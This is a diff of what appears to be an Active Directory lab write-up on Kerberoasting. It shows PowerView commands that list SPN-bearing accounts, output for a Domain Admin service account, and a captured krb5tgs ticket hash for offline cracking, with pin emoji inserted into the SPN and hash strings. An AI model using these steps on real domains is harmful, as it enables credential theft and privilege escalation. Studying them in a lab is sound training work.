@@ -21,7 +21,7 @@ We can use PowerView or ADModule for discovering such services.
 [SNIP]
 ```
 
-`. C:\AD\Tools\PowerView.ps1`
+`Import-Module C:\AD\Tools\PowerView.ps1`
 
 `Get-DomainUser -SPN`:
 ```
@@ -50,7 +50,7 @@ lastlogoff            : 12/31/1600 4:00:00 PM
 whencreated           : 11/14/2022 5:06:37 PM
 objectcategory        : CN=Person,CN=Schema,CN=Configuration,DC=moneycorp,DC=local
 dscorepropagationdata : {2/14/2025 3:40:35 PM, 2/14/2025 2:40:35 PM, 2/14/2025 1:40:35 PM, 2/14/2025 12:40:35 PM...}
-serviceprincipalname  : {MSSQLSvc📌/dcorp-mgmt.dollarcorp.moneycorp.local:1433, MSSQLSvc/dcorp-mgmt.dollarcorp.moneycorp.local}
+serviceprincipalname📌: {MSSQLSvc📌/dcorp-mgmt.dollarcorp.moneycorp.local:1433, MSSQLSvc/dcorp-mgmt.dollarcorp.moneycorp.local}
 givenname             : svc
 usnchanged            : 1139619
 memberof              : CN=Domain Admins,CN=Users,DC=dollarcorp,DC=moneycorp,DC=local
@@ -144,7 +144,7 @@ Please note that you need to remove ":1433" from the SPN in `hashes.txt` before 
 
 `type C:\AD\Tools\hashes.txt`:
 ```
-$krb5tgs$23$*svcadmin$DOLLARCORP.MONEYCORP.LOCAL$MSSQLSvc/dcorp-mgmt.dollarcorp.moneycorp.local:1433*$5D4CC629D36FC997F43A4E1929AAA3E6$19A5438620F00654A115B7E1E46B2254269A7C6F68B695F5F0B17FDB5F7CA4FE98C7B40FDC4CD69AC0BB96707979B73746D7C28A5D74DD328CCAAF0C1866480E9B5F436601CCCF7E89034C81F40B19B508E4C44CF97C9B37923F121B370A0EBB1BF283C696B9AED43E2E83E54522483ABE2C7EA2F0496B54F885AC53C61F6DD3CF...
+$krb5tgs$23$*svcadmin$DOLLARCORP.MONEYCORP.LOCAL$MSSQLSvc/dcorp-mgmt.dollarcorp.moneycorp.local:1433📌*$5D4CC629D36FC997F43A4E1929AAA3E6$19A5438620F00654A115B7E1E46B2254269A7C6F68B695F5F0B17FDB5F7CA4FE98C7B40FDC4CD69AC0BB96707979B73746D7C28A5D74DD328CCAAF0C1866480E9B5F436601CCCF7E89034C81F40B19B508E4C44CF97C9B37923F121B370A0EBB1BF283C696B9AED43E2E83E54522483ABE2C7EA2F0496B54F885AC53C61F6DD3CF...
 
 [SNIP]
 ```
